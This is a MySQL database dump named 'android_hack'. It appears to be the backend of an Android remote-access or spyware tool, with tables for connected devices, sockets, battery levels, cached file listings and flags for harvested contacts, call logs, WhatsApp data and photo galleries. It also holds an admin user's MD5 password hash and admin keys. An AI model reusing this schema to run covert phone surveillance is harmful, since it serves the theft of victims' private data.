-- MySQL dump 10.13  Distrib 5.7.17, for Linux (x86_64)
--
-- Host: localhost    Database: android_hack
-- ------------------------------------------------------
-- Server version	5.7.17-0ubuntu0.16.04.1

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Table structure for table `active`
--

DROP TABLE IF EXISTS `active`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `active` (
  `device_id` varchar(255) DEFAULT NULL,
  `socket` varchar(255) DEFAULT NULL,
  `connection` varchar(255) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `active`
--

LOCK TABLES `active` WRITE;
/*!40000 ALTER TABLE `active` DISABLE KEYS */;
INSERT INTO `active` VALUES ('355004054484715','495','wifi');
/*!40000 ALTER TABLE `active` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `admin_key`
--

DROP TABLE IF EXISTS `admin_key`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `admin_key` (
  `md5_key` varchar(150) NOT NULL,
  PRIMARY KEY (`md5_key`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `admin_key`
--

LOCK TABLES `admin_key` WRITE;
/*!40000 ALTER TABLE `admin_key` DISABLE KEYS */;
INSERT INTO `admin_key` VALUES ('000000'),('670b14728ad9902aecba32e22fa4f6bd');
/*!40000 ALTER TABLE `admin_key` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `battery_stats`
--

DROP TABLE IF EXISTS `battery_stats`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `battery_stats` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `did` int(11) DEFAULT NULL,
  `perc` int(11) DEFAULT NULL,
  `time` varchar(255) DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `did` (`did`),
  CONSTRAINT `did_reln` FOREIGN KEY (`did`) REFERENCES `devices` (`did`) ON DELETE CASCADE ON UPDATE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `battery_stats`
--

LOCK TABLES `battery_stats` WRITE;
/*!40000 ALTER TABLE `battery_stats` DISABLE KEYS */;
/*!40000 ALTER TABLE `battery_stats` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `devices`
--

DROP TABLE IF EXISTS `devices`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `devices` (
  `did` int(11) NOT NULL AUTO_INCREMENT,
  `user_name` varchar(255) NOT NULL,
  `device_id` varchar(255) NOT NULL,
  `device_name` varchar(255) DEFAULT NULL,
  `device_account` varchar(255) DEFAULT NULL,
  `device_api` int(11) DEFAULT NULL,
  `last_seen` varchar(255) DEFAULT NULL,
  `saved_contacts` varchar(255) DEFAULT NULL,
  `saved_calllog` varchar(255) DEFAULT NULL,
  `saved_whatsapp` varchar(255) DEFAULT NULL,
  `saved_gallery` varchar(255) DEFAULT NULL,
  PRIMARY KEY (`user_name`,`device_id`),
  KEY `did` (`did`),
  CONSTRAINT `username_reln` FOREIGN KEY (`user_name`) REFERENCES `users` (`user_name`) ON DELETE CASCADE ON UPDATE CASCADE
) ENGINE=InnoDB AUTO_INCREMENT=29 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;


--
-- Table structure for table `file_system`
--

DROP TABLE IF EXISTS `file_system`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `file_system` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `did` int(11) DEFAULT NULL,
  `path` varchar(255) DEFAULT NULL,
  `folder` varchar(255) DEFAULT NULL,
  `page` int(11) DEFAULT NULL,
  `cached`  varchar(1000000) DEFAULT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `uniq_id` (`did`,`path`,`folder`),
  KEY `did_reln2` (`did`),
  CONSTRAINT `did_reln2` FOREIGN KEY (`did`) REFERENCES `devices` (`did`) ON DELETE CASCADE ON UPDATE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `file_system`
--

LOCK TABLES `file_system` WRITE;
/*!40000 ALTER TABLE `file_system` DISABLE KEYS */;
/*!40000 ALTER TABLE `file_system` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `users`
--

DROP TABLE IF EXISTS `users`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `users` (
  `sno` int(11) NOT NULL AUTO_INCREMENT,
  `user_name` varchar(150) NOT NULL,
  `md5_password` varchar(150) DEFAULT NULL,
  PRIMARY KEY (`user_name`),
  KEY `sno` (`sno`)
) ENGINE=InnoDB AUTO_INCREMENT=12 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `users`
--

LOCK TABLES `users` WRITE;
/*!40000 ALTER TABLE `users` DISABLE KEYS */;
INSERT INTO `users` VALUES (1,'super_admin','761598c1f581eb98b29f73cbd3476ff5');
/*!40000 ALTER TABLE `users` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2017-02-04  2:15:01
